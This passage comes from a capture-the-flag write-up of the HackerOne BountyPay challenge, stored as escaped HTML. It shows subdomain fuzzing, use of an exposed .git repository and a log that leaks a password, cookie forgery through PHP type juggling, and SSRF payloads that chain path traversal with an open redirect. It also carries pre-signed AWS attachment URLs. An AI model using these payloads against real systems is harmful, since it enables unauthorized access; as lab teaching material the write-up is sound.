rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapp\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and staff (\u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003estaff\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). However, the policy page lists the scope as \u0026#39;*.bountypay.h1ctf.com\u0026#39;, so there are probably more. Using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fffuf%2Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003effuf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to fuzz the Host header, we find\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapi\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esoftware\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The software site says I can\u0026#39;t access it from my IP address, and the api site \u003ca href=\"/redirect?url=https%3A%2F%2Fapi.bountypay.h1ctf.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DREST%2BAPI\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eshowcases an open redirect\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on its homepage. This suggests we\u0026#39;ll find an \u003ca href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fweb-security%2Fssrf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSSRF vulnerability\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e at some point.\u003c/p\u003e\n\n\u003ch1 id=\"app-bountypay-h1ctf-com\"\u003eapp.bountypay.h1ctf.com\u003c/h1\u003e\n\n\u003ch2 id=\"getting-in\"\u003eGetting in\u003c/h2\u003e\n\n\u003cp\u003eInitially I guessed the user might be \u0026#39;sandra\u0026#39; and tried common passwords with Burp. Then I went through all the punctuation marks to see if any gave an error indicative of some sort of injection. Eventually I used ffuf to check for common files and directories. This turned up \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2F.git%2Fconfig\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ea .git/config file\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Visiting the repository for that, we find \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger%2Fblob%2Fmaster%2Flogger.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ea script\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is logging the contents of incoming requests to \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fbp_web_trace.log\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ebp_web_trace.log\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on the server as base64-encoded JSON. After using \u003ca href=\"/redirect?url=https%3A%2F%2Fgchq.github.io%2FCyberChef%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCyberChef\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to decode it, we get:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e1588931909 {\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:[]}}\n1588931919 {\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;}}}\n1588931928 {\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;POST\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:[],\u0026quot;POST\u0026quot;:{\u0026quot;username\u0026quot;:\u0026quot;brian.oliver\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;V7h0inzX\u0026quot;,\u0026quot;challenge_answer\u0026quot;:\u0026quot;bD83Jk27dQ\u0026quot;}}}\n1588931945 {\u0026quot;IP\u0026quot;:\u0026quot;192.168.1.1\u0026quot;,\u0026quot;URI\u0026quot;:\u0026quot;\\/statements\u0026quot;,\u0026quot;METHOD\u0026quot;:\u0026quot;GET\u0026quot;,\u0026quot;PARAMS\u0026quot;:{\u0026quot;GET\u0026quot;:{\u0026quot;month\u0026quot;:\u0026quot;04\u0026quot;,\u0026quot;year\u0026quot;:\u0026quot;2020\u0026quot;},\u0026quot;POST\u0026quot;:[]}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlugging that username and password into the login form, we are asked for a 2FA code. I enter the value from the log file and submit the request. It doesn\u0026#39;t work. Looking at the request in Burp we see that a hash is submitted in the \u0026#39;challenge\u0026#39; field along with the values we provided.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e110\u003c/span\u003e\n\nusername=brian.oliver\u0026amp;password=V7h0inzX\u0026amp;challenge_answer=bD83Jk27dQ\u0026amp;challenge=5ca3e50bd0b0c9b94915573b64b664be\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt looks like MD5. After using CyberChef to hash the username, password, and challenge_answer in succession, we use Burp repeater to replace the challenge value in the form and retry the requests. The hash of challenge_answer works. And returns a new cookie:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e302\u003c/span\u003e \u003cspan class=\"ne\"\u003eFound\u003c/span\u003e\n\u003cspan class=\"na\"\u003eSet-Cookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Sun, 05-Jul-2020 14:44:36 GMT; Max-Age=2592000\u003c/span\u003e\n\u003cspan class=\"na\"\u003eLocation\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e/\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI notice the cookie starts with \u003ccode\u003eeyJ\u003c/code\u003e which indicates base64-encoded JSON. I then use Burp repeater\u0026#39;s \u0026#39;Request in Browser\u0026#39; action to replay the action in the browser and log in.\u003c/p\u003e\n\n\u003ch2 id=\"a-quick-look-around\"\u003eA quick look around\u003c/h2\u003e\n\n\u003cp\u003eThe dashboard we land on after we log in has a table for listing payments. There is a form for selecting the month and year to show transactions for. No data is displayed for the current month.  Trying a few other months also returns nothing.\u003c/p\u003e\n\n\u003cp\u003eGlancing over at the Burp proxy history, we see the form submissions to go \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fstatements%3Fmonth%3D01%26year%3D2020\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/statements?month=01\u0026amp;year=2020\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The JSON output this returns indicates it\u0026#39;s a wrapper around a method on the API site:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=01\u0026amp;year=2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edescription\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eTransactions for 2020-01\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etransactions\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:[]}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing Burp Intruder to add punctuation marks to month and year has no effect. Attempting to visit the API url directly gives an error about a missing token.\u003c/p\u003e\n\n\u003cp\u003eWe also see that a file called \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fjs%2Fapp.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapp.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e was loaded. It contains the code that calls \u003ccode\u003e/statements/\u003c/code\u003e, as well as code to render the results. We see that results rows link to \u003ccode\u003e/pay/{id}/{hash}\u003c/code\u003e. Trying \u003ca href=\"/redirect?url=https%3A%2F%2Fapp.bountypay.h1ctf.com%2Fpay%2F5%2F5ca3e50bd0b0c9b94915573b64b664be\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ea random number and MD5 hash\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, we get an error \u0026#39;Invalid payment details\u0026#39;. While we can\u0026#39;t jump to making payments at this time, we know that wherever the CTF leads, we\u0026#39;ll probably end up back here.\u003c/p\u003e\n\n\u003ch2 id=\"analysis-of-the-token-cookie\"\u003eAnalysis of the \u003ccode\u003etoken\u003c/code\u003e cookie\u003c/h2\u003e\n\n\u003cp\u003eUsing CyberChef to decode the log in cookie we get:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;account_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;F8gHiqSdpK\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;hash\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere\u0026#39;s the account ID from the API site URL. We\u0026#39;ve probably found the SSRF.\u003c/p\u003e\n\n\u003cp\u003eHowever, the first thing I like to do with JSON parameters is to change the data type of the parameters and see what happens. I use the \u003ca href=\"/redirect?url=https%3A%2F%2Fportswigger.net%2Fbappstore%2F65033cbd2c344fbabe57ac060b5dd100\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHackvertor Burp plugin\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and replace the token cookie value with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_2\u0026gt;{\u0026quot;account_id\u0026quot;:[\u0026quot;F8gHiqSdpK\u0026quot;],\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u0026lt;@/base64_2\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe account_id parameter, which is expected to be a string, is now an array. In response we get:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eArray\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=01\u0026amp;year=2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;[\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eInvalid Account ID\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e]\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis tells us two things:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThis site is probably built with PHP. (The string value of an array in PHP is \u0026#39;Array\u0026#39;)\u003c/li\u003e\n\u003cli\u003eThe value of account_id doesn\u0026#39;t seem to matter to the app site. It just blindly forwards it to the API site.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003ePHP is famous for its \u003ca href=\"/redirect?url=https%3A%2F%2Fowasp.org%2Fwww-pdf-archive%2FPHPMagicTricks-TypeJuggling.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etype juggling\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. In particular, how \u003ccode\u003e\u0026quot;any string\u0026quot; == 0\u003c/code\u003e. Let\u0026#39;s try it.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_2\u0026gt;{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK\u0026quot;,\u0026quot;hash\u0026quot;:0}\u0026lt;@/base64_2\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe get the same successful response from earlier.\u003c/p\u003e\n\n\u003cp\u003eIn summary, account_id matters to the API site, and hash matters to the app site. If account_id were easily enumerable, we could stop here. But brute forcing it is worst case 62^10 = 8.3929937e+17 , so that\u0026#39;s probably not going to happen. Back to the SSRF we go.\u003c/p\u003e\n\n\u003ch2 id=\"exploit-the-ssrf\"\u003eExploit the SSRF\u003c/h2\u003e\n\n\u003cp\u003eIncorporating the information from the prologue, the goal is probably to use the open redirect on the API site to get something off the software site.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_2\u0026gt;{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://www.google.com/search?q=REST+API#\u0026quot;,\u0026quot;hash\u0026quot;:0}\u0026lt;@/base64_2\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTrying a URL other than Google, we find get an error \u0026quot;URL NOT FOUND IN WHITELIST\u0026quot;. I wasted some time thinking this would need to be chained with an \u003ca href=\"/redirect?url=https%3A%2F%2Fnakedsecurity.sophos.com%2F2020%2F05%2F15%2Fhow-scammers-abuse-google-searchs-open-redirect-feature%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eI\u0026#39;m Feeling Lucky open redirect\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. After a bit Google threw up a CAPTCHA. Then I realized I hadn\u0026#39;t actually tried to just redirect to software directly.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_2\u0026gt;{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://software.bountypay.h1ctf.com/#\u0026quot;,\u0026quot;hash\u0026quot;:0}\u0026lt;@/base64_2\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWell, that worked, and now we see a login page. Adding \u003ca href=\"/redirect?url=https%3A%2F%2Fblog.orange.tw%2F2017%2F07%2Fhow-i-chained-4-vulnerabilities-on.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCRLF to try and add headers\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or insert additional requests didn\u0026#39;t seem to work, so this is probably a GET-only SSRF and logging into the site won\u0026#39;t be possible.\u003c/p\u003e\n\n\u003cp\u003eAfter some content discovery with Intruder, we find a directory listing at /uploads/ containing one file: an Android app.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;@base64_2\u0026gt;{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://software.bountypay.h1ctf.com/uploads/BountyPay.apk#\u0026quot;,\u0026quot;hash\u0026quot;:0}\u0026lt;@/base64_2\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAttempting to download it through the SSRF gives an empty response. But downloading it directly works.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://software.bountypay.h1ctf.com/uploads/BountyPay.apk\" href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuploads%2FBountyPay.apk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/uploads/BountyPay.apk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"bountypay-apk\"\u003eBountyPay.apk\u003c/h1\u003e\n\n\u003cp\u003eI haven\u0026#39;t done much with Android apps before, but I have done some basic static analysis. This \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.hackerone.com%2Fblog%2Fandroidhackingmonth-intro-to-android-hacking\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHackerOne blog post\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is very helpful.\u003c/p\u003e\n\n\u003ch2 id=\"static-analysis\"\u003eStatic analysis\u003c/h2\u003e\n\n\u003cp\u003eI start by downloading \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fskylot%2Fjadx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ejadx\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and use it to decompile the app.\u003c/p\u003e\n\n\u003cp\u003eIt\u0026#39;s divided into 3 main files:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartOneActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sjC7HydKe68xJRniy7M2VJHo?response-content-disposition=attachment%3B%20filename%3D%22PartOneActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartOneActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=5659ae6a043077d1c47afe856e90702ddc0d17dec34d58b1184bf8413909144e\" data-attachment-type=\"text/x-java\"\u003ePartOneActivity.java (F859859)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartTwoActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/omvKHAQdg6T2947xedpyTg5S?response-content-disposition=attachment%3B%20filename%3D%22PartTwoActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartTwoActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5B